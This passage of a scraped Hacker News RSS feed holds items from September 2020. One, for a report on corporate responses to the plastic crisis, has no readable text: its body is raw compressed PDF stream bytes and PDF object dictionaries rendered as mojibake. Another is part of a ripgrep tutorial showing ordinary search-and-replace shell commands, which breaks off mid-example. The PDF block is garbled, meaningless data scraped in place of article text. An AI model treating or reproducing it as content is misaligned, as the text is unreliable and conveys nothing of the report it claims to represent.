            <link>https://ish-ar.io/terraform_blog_series_3_tips/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24504373</guid>
            <pubDate>Thu, 17 Sep 2020 13:32:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Talking trash: the corporate playbook of false solutions to the plastic crisis [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24504038">thread link</a>) | @Imaiomus
<br/>
September 17, 2020 | https://talking-trash.com/wp-content/uploads/2020/09/TalkingTrash_FullReport.pdf | <a href="https://web.archive.org/web/*/https://talking-trash.com/wp-content/uploads/2020/09/TalkingTrash_FullReport.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>_ýpKã�7Õ&lt;ŸïyášWªž¯ìµ¡ö¹þÑ÷.ñø—®Y]Ùð ýëÍÊÉþUƒkôÁ¹DªLdBV&nbsp;¿hE[±r+~¡µ}ð¡å‡Ö]è´iUÔ:¡gë‚‹ív(ÝW¤ƒúY¡–dE/°Ô+q‘Ó2s°kk×n­!ÓæP°ÿ¡QMðg6dv�gÚ¬ËÏl/Ììë’9h
vÿœ	&lt;À�Ç�ß:®Gks¯ÖÅ}Z7•´îêÛz0x!äé§ÑYq_ç¸ûÏ¾}ë¾²Öã!+œwú™$õÏÇU¡¹âs¦j&amp;iÖ^ÑïPÅ€Cã9=·�«lÃeNÿÙO�I³Ùj3gÛ™­™^¶ÍgöêL+:ÓZ¶ë&lt;øÕ¶ƒ£Ú»ön]WÜº½ôä8t|.§ï¶½bN{pvÛ¨‹i9m¾Ü¶&nbsp;º}Â•íÆ¶¯»ª}{Mû¾kÚ�G:‚×vŒªí˜p]Ç‚ºŽu7vl¯ïØ÷oÇ£‡ƒ·ÕpxÂäÃ¯›zx{Óá}Ó�	Î82jæ‘	wY0KÇFi±ËÎ¸
Nûì²-�ì›ä¸êžfÉ°O¿Þ¶`eÛ¨ÙxÖKŽ�iÛ³Q­C.»·fˆƒUˆ•~Î+OqVK&gt;ëÀÎÎç4KþïB·&lt;5àO?Ä¡æ-rhÓ9ñ�þ0q6³:	Ö&gt;·[“ÝÙ½úJÛ¦ËÛÎjÉºå®³ŸÿiRûŒJÏ‡¶=´oøÉ�›�M5£Ni|V+M�ÃfCîä&lt;›ÃÒ&lt;ã@z]mû¾Öv\~ŸOŽó®W´1¨æe™nt{Åm£þÉ§aóÁÎMwîz´óàâ£]?Z±ôè¸åG›W]¼úè¦µGw=yôàºOº~÷“Šg&gt;1ë:ï²µëèÏ¬ÑuÆ0&gt;%&amp;w�ÄøŸ»íNËÏŠŠðßúágr¡¥sÁ˜ö&nbsp;¡6#"gšpÛºËÚ¶�&lt;—ì;eÜÓ Û¸
¡Î9Y3»mÜ˜#›ÌT]‰â‚Ž$O?è‘M-ígGL��Ï)&amp;–²§6ïÈÁ�]ï9W¡õ#¹÷ÔsùçðBû¸¯·7£}ñ¿´oºº}×7ÛŽëèú­ŽŠñã¾ÝÑ|}Çâ:6ÝÔ±ë_;N8ÜõæÃ�›t¸ùÖÃ‹§ÞtÛá]Ól&gt;Òõö#wwç‘æ»�¨3&amp;�ÉÐsæ…ÓÿÙïÿ¹çÎgvìKmÍ—ž‹ÖzÀ9©3¡n6?‡A&gt;£“�±«Ë\ÑªSüEêÔÀû¬¬uxíó$½ù§BÓ‡[Çt.¨&lt;u³¡Îœ¹ç«§ÙÙÿü3¡õÿPžvn�ëêÜþHç¾Ç:�Ç�—µìè„G¬:ºnÍÑíOÝ÷ÔÑã‰O‚O2jýÙ¬âÜ'sZfü›Ñû™Mû¯¬tBœóAüs¢"yŠ;“Wý&lt;«k¼ÕßkÏØùÓÿGMæóŽØàÕÿÌÎ³öóïÞ|ñ÷Åß_ü}ñ÷ÅßI_Üóœû=Ü…âà§@W?ýçY½�%è)6Å!ÖRêØæ‹º0¢Þ4úJÜ±ƒK%îÐo3*j`®8u!þâ'ß›A@áJˆ=¨’¸ÀvíÀÔeÇ+
ãà‹‹“xÜv�ƒØ†Ê¤WÚÖ_àž‰nIQ¡„BÞNÌy¾õ˜—òhÔ¯€¸ŽÚŠgRüûo‡3Ñ;†q3€ýèqßÛ§žß–„ž\¬œùÞ˜t�–âQxvsÛ©°¾	OúÄ1Å3àiAI÷Øb
z¶£(Uø
Üw4ìLà[¶Øˆñ{Ñ+„u¶ÿøª00†åRŒæ~fÐ13JJã6|½
�­Ö¯#y³`]
5.KˆNeÕÂ»ýâ˜d‹ðÔ£O“”XOú(L–b¥~Ãdðã1”1%^Á¼Ê¢h�øù5(O¨³�ðöÆMQ1¡fx‡¢Dbž-¶Ã[h~ö&lt;ë’˜k‹
¸dm9•ÖË(X…p1)ŽÃ›‡`“ Vë�%Ïa
<qô‰b²-âzf6¿]!®É+ž�àåðúplcÄ�áigiÍ|hž�(kãn[|ó¶q04adàÙ�Ír¼Äm‹c<Éàiæy£x�bz¤ðf+¥u†ü…jc3ÄËðîai-r,…g$ú„x’kà©æ{æ)Ó�!4€'9tÈlÞuÜƒ?„¯„Å>iý¼cÑ/ŒÅ?«AŸ0÷°©&amp;y×Çò[j°\O2ÆÑý
*�á‰G¤µQ!y£:áùÁ´9¬ZÞ�Iúg=3[&lt;®ßÆxˆ¥˜˜‡lÄ ~¯�’¦ó±x2¼&nbsp;©R|ï(Nz®…5—„18…‡lk3
¢¨È&nbsp;Y‰6x ã!Vé³Ð¡±B?&amp;ÍÛFó¸……þ·&lt;ßRÑ=�þ
·Ûî—P¸Qô�ðq_‡.{± ƒJü¾Yztô9ó•¼Šz^Pƒ^E�y´yÅ¥a:·uwÁ÷1ú£&lt;¥Æ5Â—Ai2ði…à-¢t“dð¹âZlÚ&gt;Ï^”(LÓ�L`¶Ï£e(JC¸�O©Gû0]‰qÛâæ*ñ'ŠTµq¿-^c$†Å°Ù¶.Áˆ&lt;ô—Xï&amp;&amp;'é©Ó�àù6èHEðIx)ú2˜'­ÕÈŠ�¬µ­aÈß�a)¼Á9äÝÏ‘:Iš#”¼ÌÕú#¦_'èEÍ6Lâ{ôRøêéÅ-vá½ð/¢}ÀeíFÁz˜ù6Å/�±Ku¿aî,ž

ðh5zâøj(7E\ƒ­«@k+Ÿk�»~JSÖ}öÈ§á›‰Ò¨˜h»cÁXzÄm¶8È±C)M¡ñ&amp;¼@q”øžmbÚÄ!W€³ð5x¶òLÇÙLG½ƒAyáy[„(ýaMD—�h¡|³Å^øs›Zïì$ÇCƒ
Ûlµä8û©Nô�VF[½e’æ`Ý…üBìRxBY_Bþ�c;Ç:1·Ò VÃðJý:¡Lû«ašÐ'ÁCoëÜ£bX*Å»¸x+'ñ¬M(¨ãÎ(qŽ1u¤.Õ+9cã¹H}\#�ä”^‰ÂFTf}]ZÂ72¯#ŽÅJìÄŒrF‚&amp;ù­Ã(˜…aIÚ‡¯ß‚@‹õ®�7Û¦¶þz\–íÊ¯b€v¦½Ó@hˆ€�*
AœèN¬S(¿�y-(KbŽ²,ä÷F¹êæ•Öð†qS†b'Øo©Nˆà�¤Ãzž'Lb®/&nbsp;2Æ¸ó°´~ˆ‚™ž¤“'þô¤˜J'Úâa†ÁÞ)LÔô5½n?JžäD%7Ä&nbsp;îP‹Ó(š…«lñ¨]ú	çqq„Qùð¤™ß¦KAòbúÚ¸KŠ„èûú'0ÃvÄÅÛ0(ƒE°Ö&nbsp;&nbsp;ÃSÄdâ/3à!Ó§Ìtª²›Ç[xÏ®¨qM	w»ÝFÃ—ÀÀÒÒ»þ,îWa`»Ö€ùãzm~Œó;±¾�çûóçñP�Ç¼!yûv3¦Î“#¦‡Ú\G4®ÛÜ&nbsp;FÄmï%w¶e	
:,Ú¦$%¾ï6ôM£Ñî3¾Nü4�5|nùx´-’Ò‰B™Pc¾&gt;n©“¼u:Eôâ«ÍÛå&lt;õJéy½�î;üw¥9”‹íC?E£QJ®½CX¤¬t‰2bÄ¯á«5=,ËM}‰ŽõPv®6Ã³“ä…ÜÊ«à‹£Ÿ,ãÚAj­4‰×¤{šç}’é¢«ÁXŠñ¶¨Tž	(�²8ž±­ùèQˆš„xRFæÀß›p§h²m]Éú¡$},þt×G½UÒ:Ÿ°:ouBô´+ÒE›æëJ"xŒõÎÝ°J4)Îîú1l¤ŽÏb²4Ê&amp;Âtð†“-ÞßÚâÃ»�£úYeÝ+zÏÂiÒý+ôªÇI½I‘„wŸqÌo›l™Ë
ïÛ$;\ÕÊšß6\ åèòr¢™f
µæX°‰3Â¬ÖsH2ž­r„VÑ{zwª|‹ÓÞ-“¶"›7™yñô¼)˜)võ*Få’´˜®
[áßÀðX¿AÁN§ù’òØû±!Öåz!žC\cª&gt;ÍF­L´ÇGe5.PxXY?@Á"�1|ÂðÔì´BoŸÊ=fYºÁÃå˜ZdQøÜÁòËKñ�æÅ¿ÁZŽ6Š2–dÝV'<!--)«—Tapß±­È†TD9ì;õhŠ¡ØQúÜ	çÑVé@Œ:JaÚ1ÿWC""óÞDŸ×Ã´;¶û.B8=p8ˆc}QÿË±¢Ze}Þ‘¸8é½YqììÀ6ÞW$FüÑ7�…Òx(·QZG­0E�šq¹¸…Óÿ]‰5¶U‰ü­fsú“¼Õ'4OOò$­¬U¼ÃY
FWÓc­{PKl±ÓD2¢žÁ(¤Õd°P¹.Ä¬ÍZ¯«š&<‚a
�ÙÕk‰ðVKoü35V«`K÷`lkòðµ°«RZ÷Â·aeö¬ÞÄÙ“zSü¸Æ¨6
Ä'ÄµiFÄ™XR†¢Í¸*B�]6R´Ä,–ÂDu%ú„H~-ÓbZŠg1«Éì_³â‰CŽÅ“Â\ˆ÷	Úò*m‚ñz–âM›Åt?ä�ÅÐ~¬%ÊV+-Ò�eÈ L–Bk‰
óq©p·yèv|-Ç-->é½þ*ô�ã&gt;­ÃÜv¢fÞ,˜?¢9@#¸fH#M¬âi¾¿Œc�².â#Å6å!e÷�©õÜÃd=³:ƒàËLôÑtX¤‹�$nW,r(Öu¢Sšv¢4Àbúˆ‰õzeUk�ÆCÒz	„cœÇÇØ¬œˆ’Z#F–k¸Ò£­6úl2\Ð¼Þ?3Ê2©Tä7¢_·K÷Ã¤*Ä@’ØœN]�îÁJˆ÷´˜Nq9‰£Œœi2†im�åÍ7†…kàÛ™ÿ%Utµm]ï@Œ‘OoyÁ…	q�â$«§†Þß+rIxä:ž†õ˜¹¥‘¢ï*F®¡ÁÕleå‰.qVü3”›«rw±ñ¸¿ÀÝ[YÃLUßÎ3,Jþ¢:ŒÀ"+Œµ­"Öë×§E£,{‰¥eq†Cƒ¢O[®f–(žG”˜#Å¬êÆ‡ÄPx.ÇÝ	N½©,-ÌmLÓmuü’ŠßOBü,ˆè°–1QQâ,›q’é_´ó‰~ÏáIæõé*UÖ
L€CØd[ä9”Q¿ ’&nbsp;Heù¥•ØH£5²þm¢	ÚÞ	üTþ¿Iæ]‘É»RY½àK£*$þd[UðÖ ”2F¡ÚG9f�c
Ë:'ìwrÐÒÔ·àâ0¥2ŸDAˆíÃ4íÉ“EY
.ËÚIÅñ[}R¤­¼
ÕâÃí&amp;x“´$Ò·jms¥¡Þ)sÏ
’ ³0!žQƒ.Q,Yëóˆ„¿ÚÄëEß“D-º4‘ƒÇ
ˆ4{‘(WkDºCu'ÏÌì'L¤Á›ñÔc(,ÂuÑók¼#òwEÅ7dÞÓœwMÊûIçF‡E;Ax&amp;º%]¿Ž!.…-D!‡ÑíÊ}-zìo+pIQS‡�L&gt;”-10D~³ïWà«&amp;K[ÔÊBoùXïxXvù×„Dž
’o‰1žÝkòëpcxàxå.A÷U¸Ey2®	—Åx«_×n\1“&gt;‹£ŒbGVÛð­¢‰F»°üôKà{ÒzU´D[™°ù4•O�\É |ð£Ô¥Ï‰1HâÎÂóàî–Úb7ynàÄ™'J¤y¤0Á
nÑæu+cõ4Y8þU¬&nbsp;IìAÁ†6ò…4�v#F–›ROƒ2¾[™€©q°l¼§¹Pó†æ€à«,Y‰qæØd&nbsp;ÒÅ?³KVY×“Iá5f|MäÑÅÙýËðíÆ&nbsp;²UöÏBß$©øÕ¤ª8[¶›“Ic�~ØF:*?/š¦Õ`X‘˜
q€Õö�žR«÷¡GoÔ¤Å*ò¿à/Bi¦¨Ñfä*Í#vZÈ†¿gn@‘KZ_£ {˜cÅFqE;çÐfe
]ò0:\”r[Ï’¤¸^¹böÛ+dt?ÒÊ&lt;Æ¨±•Ù¿�6L&amp;Xñ‰ˆ«dÞóèS.~«åÁÎ!ÎX›KiN²)’Ì
±t±ôöÐ2#ÛÔ&amp;Å&lt;´Ÿ!ˆ‚ë»¬øËÂbc^ä&nbsp;%³}³*ü7økÊ°@~1
e&amp;ÖqM�†Pã1Ío	&gt;ùÅ:4=|Â¹
1f§ëÛvà*°Ÿñl€�ßÙÞù|,}IWk†&lt;¹(&lt;'f#*mâŒBÌ›/2o¾Ã
]‹bh›YüS€Ó2[´u*8a'ª“¡�ÞFÄ#aïjÉd¹‘1uº.d‹q´}{yÛgüå¤Ú&lt;÷Ê¥$gÖ£_4p�"mï-Bm:�XïËð×áò˜8*­oëfV§64ZcôëZcí'1R¥aÆ¾7¬™D®|�Ö/Ó�Çm.!ùP—·Ú!¢ƒr”„™‡¶i‘“tb’üq¼â0§�£„ÐóÏº�®E¿jÈg¶Í%¤eâO)~»ži†:£0zM—Ý’häz‰·Å!Wl’¸0Œ—•õ¾¶ºÒÐa\¾ñYWç"KøÑTÝ~Ç5(Ž”÷.ïöÕà¸BkOiz¨ËùÂÓ¯v¬4¢™×yê»bxRZaä§¹Úñ&amp;­W+…“Å5µR—«ÎÔ‹•Ò—/¹:c3aOçãfààv0ù|ÌU‰)ªÏ¯¸0ZõüQ®œÀ1Ù/ä½D‹ô�îJp­íð$ÒTÖÕè’ WÃÞô·œ"Ž\\f§!‹gÒ`I�Y¦ÅÓdp?
ùÍyÊZƒüH¥ñ—dÈÄ—°¹-k9]1t6*aŠ¨Ñ0e+O\,Õ¶ëRÛšß#¸0ÊóíàPjgÙ‘�Ž4š6’3Új×¸MY½^ë$~�n�º@‘ÁŸ%5ËÛî—æg±\TGMÑ·1gVjµô±¹ø½Ó¯"\½=ßz$iý,íý«-~¦Ï"âØI®Å‡øñyøŠ8§Jkf2}5Ée?FÑV\�Ë¾m|nÅqåê�p¹ô.Ô”)Ì–â{¢T¡wH÷A\âJÖ‹W!Î–N])“'l–}¢^=9«t��,lÈ»0ƒ$‰Óžaÿs1^EW!ë4£«+›8EJSb.j§3&gt;ÚÏ¶­÷PÐˆþi1Eº—¡rGxßCAqÞ’v†â`(WÌ�ÆþÖšÓ\’E.Ž�o�¤×¯G—Y˜›$ÀˆŽýÕÊ¦Ö%Wf½©�Ý€]�ó÷à?À$¼	$"vp’)¾“`c.�ßÌú‹§}�™É&gt;O¡1Iñà±í•µ¬5Hú¼%Eµ¹lú¶&lt;
f4¡ŠÌ
ßŠâ¯Ê×þ¦™õÅI].M˜-Ö«%P.¢êzj'ÊB˜Çv=¿C¢Xg[—"?ƒ
ïðÚ|…Üöm'c¹
õ›Î3²&nbsp;Ûˆ�iò¤9úÈ}9Œî˜WŠ&gt;ï1NÈ©6×l&gt;F�Â*I&amp;¢`™¹´pôh
�_â²Q?WCgñŠOÔ¶æ4µŽrªµf—iyå xùEÃv½%ÇŠç±íãû,ÉäCØ·�#•TÛs\¸ ŽG`m×¦-Ìå�ÿdA
³wrü|·êej|p,—Sá4õÙìÔæJo¯‘�Æ*¸¶ ´Šk™³øžŒ))iîP²;¹V?ÆM¶Ìä�ÔÇB{F4³Ø¦Ÿqy,ƒA¶šú-�35·êÅÁ_c³BäCäþ/ˆÖv›.Ëï56UC|q˜+DàYÅ`s³ž'…)¬†ë'üEÝà0ykp®€éÜI¨\+b
5:ˆM_×¥ž4ë³ØÚ—ÇœÊž/ƒ¡¼f»¼ŠP1ÛÊ3w‹·ÂxÓ„é¬ÎÄÎ2sÃ´bü»¹È÷‚âÚÉÈ5_–2¦Êš½2›”«½:üæ¸“Ñi–Ú¬=·€„Ð`¥ò•äzEÖ¬èj~Äh˜%\tÜÁƒìúÇ¹ý;	Rx-:”}Z§êÊH¡€ƒ“þ=&lt;Ä6-Ê²U	ÇÚ\(�g«ãæíø”Kš,Q‡Sß¤9Kcõ«ìyËR¸[‰g8¢J3â~iÝÊUÖ“Ø¢¬OØ"’KjQ'ÊXÏ5ø¸)L2
úÇ°Äv=ÈÙHÊüNÛê‘»$<a3Ê\‘hƒfzk4ë"i³é“°f ß¼="" &”¼ó³5˜15Çåø'›{'‚Á©6gß6Ö”zoišqŒ;iŽÉa¬²­="" ä§¸:ó*w¼i�¦¶Øt#&ës5¨¬ß~3Ì6µ—¾¹‚hdk�ryh´­á%ÈŒÑ0ÖlòÄöéªo¶Ì½t³^Œ½ÿëðé="" Æˆwá{}¢Ö="" ðj”&0uñ­rÆ€Ž:="" Öqz£"ØÆaëðâäîõäj0÷n+mØgo¹ˆ�§Ù®mè5ƒÂ¸´="" sóŠ“…ÀŠìÏ¤a'Íz¯éó„m="" gþ~="" kó5˜n:¬yÅ37¯ÙÒês“éð[ƒ¾¼‘îaè¾="" søŽ²ŠùÜ…p§tß„óëpkšÈhü•}�e÷sÒz‚²‰„="" ø{~Ì÷ó3õÔ·alt\«ò~‡="">›™¦ê‚Êþ\}g7g…òûœNý#˜÷Ë|„2ø“ô¾ß1¾±¹/«^CF
Wk$Ð^Zj[-�èÓwì³öòu6i‚ï¢ ‚áÎ¬£ºÚË)1}W—5Å'� ÆH°Þ› }OÆ|¡•Ívž$‰ô¹’˜ÌÆ€ßQ
àŽ:�ÙdKºlÆü_rïƒo‘.òi mÒÉ 
‹¤Wfƒ@£½O_rÃ-q~)&amp;¥ÅvÅö·c2ì»3ðù0Dá9Û=Ý÷ó±�®ÞÈ’9ÀvŠ:\³¹¸µ™3ë!›‚¶W“ÖF°Ö¢`†Ø–1Ò&nbsp;L¢Kƒ©‘œik°d	|ŠkÅûmïZøG¢o÷i&lt;«ÎíúAÚC:�é;*¢Û&amp;=³ý¸ ÂUË-|¡Xáôÿ”çKè9I¡sMã¸Å�×™¿‚÷·DßÏÛš0yâ|ß2‡?*ñÅ}Ÿ5„ÛÞ&gt;‹(º†pO«¬™[˜5FA;�õæVšš9�ÐO´V&amp;y&nbsp;+œÕ¬VZXä7¢&lt;�%RüJËÐ4°©mÏ0ß©½,­|{™ýc¶{¥†L°‡|M'dŠss£ÏWŠï³æ*Ö×­[ù±$b®õÍà,[&lt;ŒoŠ‰Mß@Áfn@‹	ÞõF².ÎÂU¶Æ$ÍhãH4“Ôõ¾í÷ù‘F[bç�gßRS”ø¥	‚	z.RASm‡Ô¸î)¹\šÑ=Hñ´þ¦A›ô*ï:©LÇ·rg‘à!ÊØ›1Â&gt;iÑ_õèûÍOsÂûÔû–Úùè xT¼v‰^b¹Í9¤rLæ¨m�Q¤Ërås[Ï7M[m-Ð
$„×”ë&lt;žCˆ+Þâÿd«îz`��Ž©3ß¬0eWÕø¦"�Û5Qøû«&amp;I=pf%±\Ys	”N~‹mí…o?¿—Áõ,BC1H2Çv5|röÞ4–ÓÊÙ9è-¡äuŠŽ‡CL¬CÒ|ò³™ý/Já5I:Š¢$å³øO
xqC¬‘œ1¯9…$Öj£»Ã2°ùÜxAúã³%¹ëÀeæêû„‰†¬å»Å˜t?Å¬7(�¿À§‹�evjYv¾&nbsp;h0&lt;”ÅT‡¨Nº=ÛËœ”Ø/ù*.¨�T³?—d�Y²©d	ú²"­�‰‹mÏÝ¹O»6sL:Å¸-:úR˜£(E|»)I5m/Šc+\üM!jšù°fpfVc.‚—š›m§f^Ç�‹$_WíæI.ÔW‡aôOb†ôäi7#Öø`°ÂÃú“�&amp;¶F4ÄaýEBœcr¥í$‰¢¿`[•œkø&gt;€|ÀG¶÷Cø›Ør}'ËÚI8�¨-ÁêìÁjÑ¨™�/ohKÊÁsxÛøÓ¹é¶åãû€�2Œž-Ôd5­£ð²µø%¼&nbsp;´b[|=SÄèî+ î áŠŠÅ�Uƒ0ØÆ…k‰Ü…'Áß�ôƒ�¦ò6óhA=ÜÀƒvw åüªËøÂìý{Âê�‘½ŠßT˜ˆüˆX›Â3Z)”ã×Š&gt;’DSŸ†­�29.Hsí£§r¾Ö$Å¿@õà‹)†Ì›eÁ|¾›y×Î»þ÷a•Ãe`®‡(åŸ‘¼¢
îgßcàÛ­û&nbsp;øÊèeãý³(F€õÜ€zxVœÖü3ÂÝ7¸¢	Î7õÜ™óx;ûn�þž�zXÄ§H4;�ß6f,býù(ÞƒŠzÃš‹««08
‚Wþ£“¿1¼Òö
ã¯@¹Äv”ë9„)5hRWÛk"=Að^›;Ã£ÍãJ¬WÿßÙ|¶íÿ?þ¹(Z?]Ž"T=õgby

endstream
endobj
1572 0 obj
&lt;&lt;
/Type /Page
/CropBox [ 0 0 1190.55 841.89 ]
/MediaBox [ 0 0 1190.55 841.89 ]
/Rotate 0
/Resources &lt;&lt; /ColorSpace &lt;&lt; /CS0 1573 0 R &gt;&gt; /ExtGState &lt;&lt; /GS0 1575 0 R
/GS1 1576 0 R /GS2 1577 0 R /GS3 1578 0 R /GS4 1579 0 R /GS5 1580 0 R /GS6
1581 0 R /GS7 1582 0 R /GS8 1583 0 R /GS9 1584 0 R /GS10 1585 0 R /GS11
1586 0 R /GS12 1587 0 R /GS13 1588 0 R /GS14 1589 0 R /GS15 1590 0 R /GS16
1591 0 R /GS17 1592 0 R /GS18 1600 0 R &gt;&gt; /Font &lt;&lt; /T1_0 1601 0 R /T1_1
1606 0 R /T1_2 1611 0 R /T1_3 1616 0 R /T1_4 1619 0 R &gt;&gt; /XObject &lt;&lt; /X1
1623 0 R /X3 1634 0 R /X19 1642 0 R /X20 1660 0 R /X22 1661 0 R /X30
1667 0 R /X32 1675 0 R /X33 1678 0 R /X34 1679 0 R /X37 1680 0 R /X39
1683 0 R /X40 1685 0 R /X66 1686 0 R /X72 1712 0 R /X76 1718 0 R /X77
1722 0 R /X90 1723 0 R /X114 1736 0 R /X117 1760 0 R /X130 1763 0 R /X143
1776 0 R /X147 1789 0 R /X171 1793 0 R /X172 1817 0 R /X198 1818 0 R /X222
1844 0 R /X223 1868 0 R /X236 1869 0 R /X238 1882 0 R /X262 1884 0 R /X263
1908 0 R /X266 1909 0 R /X270 1912 0 R /X271 1916 0 R /X297 1917 0 R /X300
1943 0 R /X301 1946 0 R /X304 1947 0 R /X308 1950 0 R /X309 1954 0 R /X322
1955 0 R /X335 1968 0 R /X338 1981 0 R /X342 1984 0 R /X357 1988 0 R /X363
2003 0 R /X386 2009 0 R /X389 2032 0 R /X393 2035 0 R /X417 2039 0 R /X421
2063 0 R /X422 2067 0 R /X424 2068 0 R /X425 2070 0 R /X428 2071 0 R /X429
2074 0 R /X433 2075 0 R /X434 2079 0 R /X447 2080 0 R /X460 2093 0 R /X463
2106 0 R /X489 2109 0 R /X495 2135 0 R /X519 2141 0 R /X522 2165 0 R /X546
2168 0 R /X547 2192 0 R /X548 2193 0 R /X551 2194 0 R /X554 2197 0 R /X557
2200 0 R /X561 2203 0 R /X563 2207 0 R /X564 2209 0 R /X590 2210 0 R /X596
2236 0 R /X600 2242 0 R /X601 2246 0 R /X614 2247 0 R /X638 2260 0 R /X641
2284 0 R /X645 2287 0 R /X658 2291 0 R /X662 2304 0 R /X686 2308 0 R /X687
2332 0 R /X688 2333 0 R /X689 2334 0 R /X715 2335 0 R /X739 2361 0 R /X740
2385 0 R /X753 2386 0 R /X755 2399 0 R /X779 2401 0 R /X780 2425 0 R /X781
2426 0 R /X783 2427 0 R /X786 2429 0 R /X790 2432 0 R /X791 2436 0 R /X817
2437 0 R /X820 2463 0 R /X821 2466 0 R /X824 2467 0 R /X825 2470 0 R /X826
2471 0 R /X851 2472 0 R /X854 2498 0 R /X856 2501 0 R /X857 2503 0 R /X883
2504 0 R /X889 2530 0 R /X893 2536 0 R /X894 2540 0 R /X907 2541 0 R /X931
2554 0 R /X934 2578 0 R /X935 2581 0 R /X948 2582 0 R /X952 2595 0 R /X976
2599 0 R /X977 2623 0 R /X1001 2624 0 R /X1002 2648 0 R /X1015 2649 0 R
/X1017 2662 0 R /X1041 2664 0 R /X1042 2688 0 R /X1046 2689 0 R /X1049
2693 0 R /X1050 2696 0 R /X1051 2697 0 R /X1054 2698 0 R /X1055 2701 0 R
/X1058 2702 0 R /X1059 2705 0 R /X1062 2706 0 R /X1086 2709 0 R /X1110
2733 0 R /X1113 2757 0 R /X1117 2760 0 R /X1118 2764 0 R /X1120 2765 0 R
/X1121 2767 0 R /X1124 2768 0 R /X1128 2771 0 R /X1130 2775 0 R /X1136
2777 0 R /X1142 2783 0 R /X1143 2789 0 R /X1161 2790 0 R /X1164 2808 0 R
/X1168 2811 0 R /X1181 2815 0 R /X1194 2828 0 R /X1198 2841 0 R /X1222
2845 0 R /X1223 2869 0 R /X1224 2870 0 R /X1250 2871 0 R /X1274 …</a3ê\‘hƒfzk4ë"i³é“°f></qô‰b²-âzf6¿]!®é+ž�àåðúplcä�áigií|hž�(kãn[|ó¶q04adàù�ír¼äm‹c<éàiæy£x�bz¤ðf+¥u†ü…jc3äëðîai-r,…g$ú„x’kà©æ{æ)ó�!4€'9tèlþuüƒ?„¯„å></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://talking-trash.com/wp-content/uploads/2020/09/TalkingTrash_FullReport.pdf">https://talking-trash.com/wp-content/uploads/2020/09/TalkingTrash_FullReport.pdf</a></em></p>]]>
            </description>
            <link>https://talking-trash.com/wp-content/uploads/2020/09/TalkingTrash_FullReport.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24504038</guid>
            <pubDate>Thu, 17 Sep 2020 12:59:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Search and Replace Tricks with Ripgrep]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24503895">thread link</a>) | @fanf2
<br/>
September 17, 2020 | https://learnbyexample.github.io/substitution-with-ripgrep/ | <a href="https://web.archive.org/web/*/https://learnbyexample.github.io/substitution-with-ripgrep/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    

    <div>
      <p><a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> (command name <code>rg</code>) is a <code>grep</code> tool, but supports search and replace as well. <code>rg</code> is far from a like-for-like alternate for <code>sed</code>, but it has nifty features like multiline replacement, fixed string matching, <code>PCRE2</code> support, etc. This post gives an overview of syntax for substitution and highlights some of the cases where <code>rg</code> is a handy replacement for <code>sed</code>.</p>
<h2 id="global-search-and-replace">Global search and replace<a href="#global-search-and-replace" aria-label="Anchor link for: global-search-and-replace">🔗</a></h2>
<pre><code><span>$ cat ip.txt
dark blue, light blue
light orange
blue sky

</span><span># by default, line number is displayed if output destination is stdout
# by default, only lines that matched the given pattern is displayed
# 'blue' is search pattern and -r 'red' is replacement string
</span><span>$ rg </span><span>'blue' </span><span>-</span><span>r </span><span>'red'</span><span> ip.txt
</span><span>1:dark</span><span> red, light red
</span><span>3:red</span><span> sky

</span><span># --passthru option is useful to print all lines, whether or not it matched
# -N will disable line number prefix
# this command is similar to: sed 's/blue/red/g' ip.txt
</span><span>$ rg </span><span>--</span><span>passthru </span><span>-</span><span>N </span><span>'blue' </span><span>-</span><span>r </span><span>'red'</span><span> ip.txt
dark red, light red
light orange
red sky
</span></code></pre><br>
<h2 id="matching-nth-occurrence">Matching Nth occurrence<a href="#matching-nth-occurrence" aria-label="Anchor link for: matching-nth-occurrence">🔗</a></h2>
<p>As seen in previous example, <code>rg</code> will search and replace all occurrences. So, you'll have to be creative with regexp to replace only a specific occurrence per input line.</p>
<pre><code><span>$ s=</span><span>'see bat hot at but at go gate at sat at but at'

</span><span># replace first occurrence only
# same as: sed 's/\bat\b/[xyz]/'
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>-</span><span>N </span><span>'\bat\b(.*)' </span><span>-</span><span>r </span><span>'[xyz]$1'</span><span>
see bat hot [xyz] but at go gate at sat at but at

</span><span># same as: sed 's/\bat\b/[xyz]/3'
# the number within {} is N-1 to replace Nth occurrence, for N&gt;1
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>-</span><span>N </span><span>'^((.*?\bat\b){2}.*?)\bat\b' </span><span>-</span><span>r </span><span>'$1[xyz]'</span><span>
see bat hot at but at go gate [xyz] sat at but at

</span><span># replace last but Nth occurrence, for N&gt;=0
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>-</span><span>N </span><span>'^(.*)\bat\b((.*\bat\b){3})' </span><span>-</span><span>r </span><span>'$1[xyz]$2'</span><span>
see bat hot at but [xyz] go gate at sat at but at
</span></code></pre><br>
<h2 id="in-place-workaround">In-place workaround<a href="#in-place-workaround" aria-label="Anchor link for: in-place-workaround">🔗</a></h2>
<p><code>rg</code> doesn't support in-place option, so you'll have to do it yourself.</p>
<pre><code><span># -N isn't needed here as output destination is a file
# same as: sed -i 's/blue/red/g' ip.txt
</span><span>$ rg </span><span>--</span><span>passthru </span><span>'blue' </span><span>-</span><span>r </span><span>'red'</span><span> ip.txt </span><span>&gt;</span><span> tmp.txt </span><span>&amp;&amp;</span><span> mv tmp.txt ip.txt

$ cat ip.txt
dark red, light red
light orange
red sky
</span></code></pre>
<p>If you have <a href="https://joeyh.name/code/moreutils/">moreutils installed</a>, then you could use <code>sponge</code> as well.</p>
<pre><code><span>rg </span><span>--</span><span>passthru </span><span>'blue' </span><span>-</span><span>r </span><span>'red'</span><span> ip.txt </span><span>|</span><span> sponge ip.txt
